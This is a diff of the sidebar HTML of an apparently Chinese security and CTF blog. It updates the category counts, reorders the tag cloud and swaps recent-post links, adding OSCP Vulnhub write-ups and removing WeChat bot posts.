+     <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/SRC%E6%8C%96%E6%8E%98/">SRC挖掘</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%AA%E4%BA%BA%E9%A1%B9%E7%9B%AE/">个人项目</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/">竞赛</a><span class="category-list-count">21</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/AWD/">AWD</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/">CTF</a><span class="category-list-count">20</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/Classical-Crypto/">Classical Crypto</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/Misc/">Misc</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/PWN/">PWN</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/Reverse/">Reverse</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/Web/">Web</a><span class="category-list-count">9</span></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%9F%E6%9F%A5/">速查</a><span class="category-list-count">4</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%9F%E6%9F%A5/CTF/">CTF</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%9F%E6%9F%A5/%E5%8D%9A%E5%AE%A2/">博客</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">靶场练习</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/OSCP/">OSCP</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/OSCP/Vulnhub/">Vulnhub</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/OSCP/Vulnhub/Easy/">Easy</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/OSCP/Vulnhub/Intermediate/">Intermediate</a><span class="category-list-count">1</span></li></ul></li></ul></li></ul></li></ul> 
 </div>
  
 
@@ -651,41 +555,41 @@ f<span class="token operator">=</span>str1<span class="token punctuation">.</spa
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/奇技淫巧/">奇技淫巧<span>2</span></a></li>
-		
-			<li><a href="/tags/笔记/">笔记<span>1</span></a></li>
-		
-			<li><a href="/tags/AWD/">AWD<span>1</span></a></li>
-		
 			<li><a href="/tags/CTF/">CTF<span>20</span></a></li>
-		
-			<li><a href="/tags/Misc/">Misc<span>5</span></a></li>
-		
-			<li><a href="/tags/博客/">博客<span>1</span></a></li>
-		
-			<li><a href="/tags/PWN/">PWN<span>4</span></a></li>
-		
-			<li><a href="/tags/速查/">速查<span>3</span></a></li>
-		
-			<li><a href="/tags/考证/">考证<span>1</span></a></li>
 		
 			<li><a href="/tags/SRC挖掘/">SRC挖掘<span>1</span></a></li>
 		
-			<li><a href="/tags/其他/">其他<span>1</span></a></li>
+			<li><a href="/tags/Misc/">Misc<span>5</span></a></li>
 		
-			<li><a href="/tags/Web/">Web<span>10</span></a></li>
+			<li><a href="/tags/Vulnhub/">Vulnhub<span>2</span></a></li>
+		
+			<li><a href="/tags/PWN/">PWN<span>4</span></a></li>
 		
 			<li><a href="/tags/项目/">项目<span>3</span></a></li>
 		
-			<li><a href="/tags/OSCP/">OSCP<span>1</span></a></li>
+			<li><a href="/tags/靶场练习/">靶场练习<span>2</span></a></li>
 		
-			<li><a href="/tags/Classical-Crypto/">Classical Crypto<span>1</span></a></li>
+			<li><a href="/tags/AWD/">AWD<span>1</span></a></li>
 		
-			<li><a href="/tags/渗透测试/">渗透测试<span>2</span></a></li>
+			<li><a href="/tags/速查/">速查<span>3</span></a></li>
 		
 			<li><a href="/tags/Reverse/">Reverse<span>1</span></a></li>
 		
-			<li><a href="/tags/靶场练习/">靶场练习<span>1</span></a></li>
+			<li><a href="/tags/奇技淫巧/">奇技淫巧<span>2</span></a></li>
+		
+			<li><a href="/tags/Web/">Web<span>10</span></a></li>
+		
+			<li><a href="/tags/Classical-Crypto/">Classical Crypto<span>1</span></a></li>
+		
+			<li><a href="/tags/其他/">其他<span>1</span></a></li>
+		
+			<li><a href="/tags/博客/">博客<span>1</span></a></li>
+		
+			<li><a href="/tags/OSCP/">OSCP<span>2</span></a></li>
+		
+			<li><a href="/tags/笔记/">笔记<span>1</span></a></li>
+		
+			<li><a href="/tags/渗透测试/">渗透测试<span>2</span></a></li>
 		
 		 
 		</ul>
@@ -699,6 +603,14 @@ f<span class="token operator">=</span>str1<span class="token punctuation">.</spa
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2024/12/16/OSCP-symfonos1/" ><i class="fa fa-file-o"></i>OSCP-Easy-symfonos_1</a>
+      </li>
+    
+      <li>
+        <a href="/2024/09/05/OSCPBTRsys/" ><i class="fa fa-file-o"></i>OSCP-Easy-BTRsys</a>
+      </li>
+    
+      <li>
         <a href="/2024/07/13/infogather/" ><i class="fa fa-file-o"></i>信息搜集指南</a>
       </li>
     
@@ -708,14 +620,6 @@ f<span class="token operator">=</span>str1<span class="token punctuation">.</spa
     
       <li>
         <a href="/2024/04/11/typora/" ><i class="fa fa-file-o"></i>Typora学习版</a>
-      </li>
-    
-      <li>
-        <a href="/2024/02/04/winwxbot/" ><i class="fa fa-file-o"></i>Windows服务器微信机器人</a>
-      </li>
-    
-      <li>
-        <a href="/2024/02/04/wxbot/" ><i class="fa fa-file-o"></i>Linux服务器微信机器人</a>
       </li>
     
   </ul>
